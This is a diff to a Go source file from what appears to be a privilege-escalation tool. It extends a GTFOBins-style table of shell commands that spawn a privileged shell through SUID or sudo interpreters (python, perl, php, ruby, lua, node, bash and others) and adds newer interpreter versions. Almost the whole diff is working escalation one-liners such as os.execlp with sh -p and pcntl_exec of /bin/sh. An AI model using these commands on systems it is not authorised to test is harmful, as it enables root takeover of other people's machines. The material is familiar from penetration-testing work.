@@ -4,55 +4,52 @@ package main
 // Each entry maps a binary name to its command string.
 // Variables: {shell} → spawns shell, {cmd}→ executes command, {read}→ reads file
 
-type GTFOEntry struct {
-	SudoCmd string   // Command for sudo-based exploitation
-	SuidCmd string   // Command for SUID-based exploitation
-	Tags    []string // suid, sudo, file_read, file_write, shell, command
-}
-
-type GTFOEntrySet struct {
-	Cmds    map[string]func() string // Dynamic commands (need formatting)
-	Static  map[string]string         // Static commands
-}
-
 var gtfoLookup = map[string]string{}
 
 func init() {
 	// SUID bins — spawn root shell
 	suidBins := []string{
-		"python", "python2", "python3", "python3.8", "python3.9", "python3.10", "python3.11", "python3.12",
+		"python", "python2", "python3", "python3.8", "python3.9", "python3.10", "python3.11", "python3.12", "python3.13",
 		"perl", "perl5",
-		"php", "php5", "php7", "php8",
+		"php", "php5", "php7", "php8", "php8.1", "php8.2",
 		"ruby", "ruby2", "ruby3",
-		"lua", "node",
-		"bash", "dash", "zsh", "ksh", "fish",
+		"lua", "lua5.3", "lua5.4",
+		"node", "nodejs",
+		"bash", "dash", "zsh", "ksh", "fish", "sh",
 	}
 
 	shellCmd := map[string]string{
-		"python":   `python3 -c 'import os; os.execlp("sh","sh","-p")'`,
-		"python2":  `python -c 'import os; os.execlp("sh","sh","-p")'`,
-		"python3":  `python3 -c 'import os; os.execlp("sh","sh","-p")'`,
+		"python":     `python3 -c 'import os; os.execlp("sh","sh","-p")'`,
+		"python2":    `python -c 'import os; os.execlp("sh","sh","-p")'`,
+		"python3":    `python3 -c 'import os; os.execlp("sh","sh","-p")'`,
 		"python3.8":  `python3.8 -c 'import os; os.execlp("sh","sh","-p")'`,
 		"python3.9":  `python3.9 -c 'import os; os.execlp("sh","sh","-p")'`,
 		"python3.10": `python3.10 -c 'import os; os.execlp("sh","sh","-p")'`,
 		"python3.11": `python3.11 -c 'import os; os.execlp("sh","sh","-p")'`,
 		"python3.12": `python3.12 -c 'import os; os.execlp("sh","sh","-p")'`,
-		"perl":     `perl -e 'exec "sh","-p"'`,
-		"perl5":    `perl -e 'exec "sh","-p"'`,
-		"php":      `php -r 'pcntl_exec("/bin/sh", array("-p"));'`,
-		"php5":     `php -r 'pcntl_exec("/bin/sh", array("-p"));'`,
-		"php7":     `php -r 'pcntl_exec("/bin/sh", array("-p"));'`,
-		"php8":     `php -r 'pcntl_exec("/bin/sh", array("-p"));'`,
-		"ruby":     `ruby -e 'exec "/bin/sh","-p"'`,
-		"ruby2":    `ruby -e 'exec "/bin/sh","-p"'`,
-		"ruby3":    `ruby -e 'exec "/bin/sh","-p"'`,
-		"lua":      `lua -e 'os.execute("/bin/sh -p")'`,
-		"node":     `node -e 'require("child_process").spawn("/bin/sh",["-p"],{stdio:"inherit"})'`,
-		"bash":     `bash -p`,
-		"dash":     `dash -p`,
-		"zsh":      `zsh`,
-		"ksh":      `ksh -p`,
-		"fish":     `fish`,
+		"python3.13": `python3.13 -c 'import os; os.execlp("sh","sh","-p")'`,
+		"perl":       `perl -e 'exec "sh","-p"'`,
+		"perl5":      `perl -e 'exec "sh","-p"'`,
+		"php":        `php -r 'pcntl_exec("/bin/sh", array("-p"));'`,
+		"php5":       `php -r 'pcntl_exec("/bin/sh", array("-p"));'`,
+		"php7":       `php -r 'pcntl_exec("/bin/sh", array("-p"));'`,
+		"php8":       `php -r 'pcntl_exec("/bin/sh", array("-p"));'`,
+		"php8.1":     `php8.1 -r 'pcntl_exec("/bin/sh", array("-p"));'`,
+		"php8.2":     `php8.2 -r 'pcntl_exec("/bin/sh", array("-p"));'`,
+		"ruby":       `ruby -e 'exec "/bin/sh","-p"'`,
+		"ruby2":      `ruby -e 'exec "/bin/sh","-p"'`,
+		"ruby3":      `ruby -e 'exec "/bin/sh","-p"'`,
+		"lua":        `lua -e 'os.execute("/bin/sh -p")'`,
+		"lua5.3":     `lua5.3 -e 'os.execute("/bin/sh -p")'`,
+		"lua5.4":     `lua5.4 -e 'os.execute("/bin/sh -p")'`,
+		"node":       `node -e 'require("child_process").spawn("/bin/sh",["-p"],{stdio:"inherit"})'`,
+		"nodejs":     `nodejs -e 'require("child_process").spawn("/bin/sh",["-p"],{stdio:"inherit"})'`,
+		"bash":       `bash -p`,
+		"dash":       `dash -p`,
+		"zsh":        `zsh`,
+		"ksh":        `ksh -p`,
+		"fish":       `fish`,
+		"sh":         `sh -p`,
 	}
 
 	sudoOnly := map[string]string{
@@ -115,10 +112,11 @@ func init() {
 
 var suidShellBins = map[string]bool{
 	"python": true, "python2": true, "python3": true, "python3.8": true, "python3.9": true,
-	"python3.10": true, "python3.11": true, "python3.12": true,
-	"perl": true, "perl5": true, "php": true, "php5": true, "php7": true, "php8": true,
-	"ruby": true, "ruby2": true, "ruby3": true, "lua": true, "node": true,
-	"bash": true, "dash": true, "zsh": true, "ksh": true, "fish": true,
+	"python3.10": true, "python3.11": true, "python3.12": true, "python3.13": true,
+	"perl": true, "perl5": true, "php": true, "php5": true, "php7": true, "php8": true, "php8.1": true, "php8.2": true,
+	"ruby": true, "ruby2": true, "ruby3": true, "lua": true, "lua5.3": true, "lua5.4": true,
+	"node": true, "nodejs": true,
+	"bash": true, "dash": true, "zsh": true, "ksh": true, "fish": true, "sh": true,
 }
 
 func getCommand(bin string) (string, bool) {
